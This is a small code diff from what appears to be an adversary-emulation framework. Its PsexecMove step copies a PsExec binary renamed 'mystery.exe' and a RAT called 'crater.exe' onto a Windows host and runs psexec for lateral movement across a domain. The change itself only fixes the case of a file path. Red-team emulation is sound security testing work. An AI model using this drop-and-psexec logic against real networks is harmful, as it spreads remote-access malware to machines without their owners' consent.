@@ -865,7 +865,7 @@ class PsexecMove(Step):
         ps_loc = "C:\\Users\\" + user.username + "\\mystery.exe"
         rat_loc = "C:\\Users\\" + user.username + "\\crater.exe"
         await operation.drop_file(rat, ps_loc, "../dep/tools/ps.hex")
-        await operation.drop_file(rat, rat_loc, "../dep/crater/crater/cratermain.exe")
+        await operation.drop_file(rat, rat_loc, "../dep/crater/crater/CraterMain.exe")
         await file_g({'path': ps_loc, 'host': rat.host, 'use_case': 'dropped'})
         await file_g({'path': rat_loc, 'host': rat.host, 'use_case': 'dropped'})
         await operation.execute_shell_command(rat, *psexec.copy(ps_loc, rat_loc, domain.windows_domain, user.username,
